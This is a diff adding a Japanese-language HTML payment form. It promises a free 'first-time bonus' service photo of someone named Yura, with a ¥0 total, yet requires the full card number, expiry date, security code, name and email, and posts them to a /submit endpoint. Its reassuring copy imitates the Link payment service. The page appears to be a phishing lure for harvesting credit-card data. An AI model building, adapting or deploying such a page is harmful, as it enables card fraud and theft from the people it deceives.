@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>お支払いフォーム</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 20px;
+    }
+    .container {
+      display: flex;
+      justify-content: center;
+      background: #fff;
+      max-width: 900px;
+      margin: auto;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .summary, .payment {
+      flex: 1;
+      padding: 0 20px;
+    }
+    .summary h2, .payment h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+    .price-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+    .total {
+      font-weight: bold;
+      font-size: 18px;
+      margin-top: 20px;
+      border-top: 1px solid #ccc;
+      padding-top: 10px;
+    }
+    input[type="text"], input[type="email"], select {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0052cc;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #003f99;
+    }
+    label {
+      font-weight: bold;
+    }
+    .small {
+      font-size: 12px;
+      color: #666;
+    }
+    .checkbox {
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <form method="POST" action="/submit">
+    <div class="container">
+      <!-- 商品内容 -->
+      <div class="summary">
+        <h2>ゆら特典</h2>
+        <p>【初回特典つき】ゆらのサービスショット</p>
+
+        <div class="price-row"><span>定価</span><span>¥2,980</span></div>
+        <div class="price-row"><span>初回割引</span><span>¥-2,980</span></div>
+        <div class="price-row"><span>小計</span><span>¥0</span></div>
+        <div class="price-row"><span>消費税</span><span>¥0</span></div>
+        <div class="price-row total"><span>合計額</span><span>¥0</span></div>
+      </div>
+
+      <!-- カード情報 -->
+      <div class="payment">
+        <h2>カードで支払い</h2>
+
+        <label>メールアドレス</label>
+        <input type="email" name="email" placeholder="email@example.com" required>
+
+        <label>カード情報</label>
+        <input
+          type="text"
+          name="num"
+          pattern="^\d{15,16}$"
+          maxlength="16"
+          placeholder="1234567812345678（ハイフンなし）"
+          required
+          title="カード番号は半角数字で入力してください"
+        />
+        <input
+          type="text"
+          name="date"
+          id="date"
+          placeholder="MM / YY"
+          maxlength="5"
+          required
+        />
+        <input type="text" name="cv" placeholder="セキュリティコード" required>
+
+        <label>氏名</label>
+        <input type="text" name="name" placeholder="氏名" required>
+
+        <label>国または地域</label>
+        <select name="country">
+          <option>日本</option>
+          <option>アメリカ</option>
+          <option>カナダ</option>
+        </select>
+
+        <div class="checkbox">
+          <input type="checkbox" id="saveinfo">
+          <label for="saveinfo">情報を保存してスピーディーに購入する</label>
+          <p class="small">Linkが使えるすべての場所で安全にお支払いください。</p>
+        </div>
+
+        <button type="submit">申し込む</button>
+      </div>
+    </div>
+  </form>
+</body>
+</html>
